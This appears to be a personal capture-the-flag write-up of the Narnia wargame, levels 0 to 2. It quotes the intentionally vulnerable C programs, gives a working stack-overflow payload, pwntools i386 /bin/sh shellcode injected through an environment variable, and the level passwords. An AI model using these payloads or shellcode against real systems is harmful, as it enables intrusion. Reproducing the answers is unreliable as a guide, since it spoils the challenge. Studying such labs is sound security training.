# Narnia

It looks like this is a set of C exploit challenges:
```bash
narnia0@narnia:~$ cd /narnia/
narnia0@narnia:/narnia$ ls -l
total 108
-r-sr-x--- 1 narnia1 narnia0 7568 Nov  9  2017 narnia0
-r--r----- 1 narnia0 narnia0 1186 Nov  9  2017 narnia0.c
-r-sr-x--- 1 narnia2 narnia1 7404 Nov  9  2017 narnia1
-r--r----- 1 narnia1 narnia1 1000 Nov  9  2017 narnia1.c
-r-sr-x--- 1 narnia3 narnia2 5164 Nov  9  2017 narnia2
-r--r----- 1 narnia2 narnia2  999 Nov  9  2017 narnia2.c
-r-sr-x--- 1 narnia4 narnia3 5836 Nov  9  2017 narnia3
-r--r----- 1 narnia3 narnia3 1841 Nov  9  2017 narnia3.c
-r-sr-x--- 1 narnia5 narnia4 5336 Nov  9  2017 narnia4
-r--r----- 1 narnia4 narnia4 1064 Nov  9  2017 narnia4.c
-r-sr-x--- 1 narnia6 narnia5 5700 Nov  9  2017 narnia5
-r--r----- 1 narnia5 narnia5 1261 Nov  9  2017 narnia5.c
-r-sr-x--- 1 narnia7 narnia6 6076 Nov  9  2017 narnia6
-r--r----- 1 narnia6 narnia6 1602 Nov  9  2017 narnia6.c
-r-sr-x--- 1 narnia8 narnia7 6676 Nov  9  2017 narnia7
-r--r----- 1 narnia7 narnia7 1974 Nov  9  2017 narnia7.c
-r-sr-x--- 1 narnia9 narnia8 5232 Nov  9  2017 narnia8
-r--r----- 1 narnia8 narnia8 1292 Nov  9  2017 narnia8.c
```
Each user can read the source of the challenge level and each binary is a setuid
binary that runs under the next user.

Now that I've done a few, these are definitely more involved that anything else
so far in overthewire: there is zero hand holding and each comes down to
essentially (for me) three parts:
  1) Identify the target in the source code.
  2) Google what you can do with that...
  3) Exploit it!


### lvl-0
```c
#include <stdio.h>
#include <stdlib.h>

int main(){
	long val=0x41414141;
	char buf[20];

	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
	printf("Here is your chance: ");
	scanf("%24s",&buf);

	printf("buf: %s\n",buf);
	printf("val: 0x%08x\n",val);

	if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
		system("/bin/sh");
    }
	else {
		printf("WAY OFF!!!!\n");
		exit(1);
	}

	return 0;
}
```

So...we need to provide some input that overflows the `buf` buffer.
The buffer is 20 characters long but the `scanf` reads 24 characters which will
stomp on the value of `val`. We need to set those last 4 characters correctly.

OK, a bit of hacking around in Python didn't get me very far as It looks like I
need a way of providing HEX input to the program as `0xad` is non-printable.
(See https://www.rapidtables.com/code/text/ascii-table.html for a full table).

You can use `echo -e` to use hex escape codes so lets try that:
```bash
narnia0@narnia:/narnia$ echo -en "AAAAAAAAAAAAAAAAAAAA\xde\xad\xbe\xef" | ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAޭ��
val: 0xefbeadde
WAY OFF!!!!
```

That's the correct hex pairs but reversed...(after a bit of googling, this is
because of the direction the stack is growing: I need to reverse the pairs in
the input.)

```bash
narnia0@narnia:/narnia$ echo -en "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde" | ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
```

Success!...but no shell. WTF? Let's try creating the payload string with python:

```bash
narnia0@narnia:/narnia$ python -c "print ('a' * 20) + '\xef\xbe\xad\xde\x88'"
aaaaaaaaaaaaaaaaaaaaﾭވ

# Copy that and then paste in at the prompt

narnia0@narnia:/narnia$ ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: aaaaaaaaaaaaaaaaaaaaﾭވ
buf: aaaaaaaaaaaaaaaaaaaaﾭ�
val: 0xdeadbeef
$ whoami
narnia1
$ cat /etc/narnia_pass/narnia1
efeidiedae
```
Woo!

efeidiedae


### lvl-1
```c
#include <stdio.h>

int main(){
	int (*ret)();

	if(getenv("EGG")==NULL){    
		printf("Give me something to execute at the env-variable EGG\n");
		exit(1);
	}

	printf("Trying to execute EGG!\n");
	ret = getenv("EGG");
	ret();

	return 0;
}
```

Sooo...what? This looks something up in the environment then tries to call it as
a C function?!

```bash
narnia1@narnia:/narnia$ ./narnia1
Give me something to execute at the env-variable EGG

narnia1@narnia:/narnia$ EGG=ls ./narnia1
Trying to execute EGG!
Segmentation fault
```

So, whatever gets returned from the ENV lookup, gets executed as a C function
(or it tries to at least). Back to google!

Ah, so this needs to be some `shellcode`: a set of assembler instructions that
open a remote shell. There are tonnes of examples online...but URGH that feels
nasty to try one out! Good job it's on this remote server...!

Oh! pwntools! Looks like they have a bunch of built in stuff for precisely this
sort of thing:
```python
# python2 only on this server (maybe at all?)
>>> from pwn import *
>>> asm(shellcraft.i386.linux.sh())  # Look into this more...
'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
```

```bash
narnia1@narnia:/narnia$ EGG=$'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80' ./narnia1
Trying to execute EGG!
$ whoami
narnia1
```
Something seems to be borked...every write up I can find on this says that this
the correct thing to do and it should be a shell with `narnia2` perms not
`narnia1`... :(

Looking it up:
nairiepecu


### lvl-2
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
	char buf[128];

	if(argc == 1){
		printf("Usage: %s argument\n", argv[0]);
		exit(1);
	}
	strcpy(buf,argv[1]);
	printf("%s", buf);

	return 0;
}
```

So, we have an unguarded strcopy which means that we can...do stuff? Need to research this one!
```
$ man strcpy
.
.
.
BUGS
       If  the  destination  string  of  a  strcpy()  is  not large enough, then anything might happen.  Overflowing fixed-length string buffers is a
       favorite cracker technique for taking complete control of the machine.  Any time a program reads or copies data into  a  buffer,  the  program
       first needs to check that there's enough space.  This may be unnecessary if you can show that overflow is impossible, but be careful: programs
       can get changed over time, in ways that may make the impossible possible.
```

Well THAT sounds like the sort of thing I'm after!
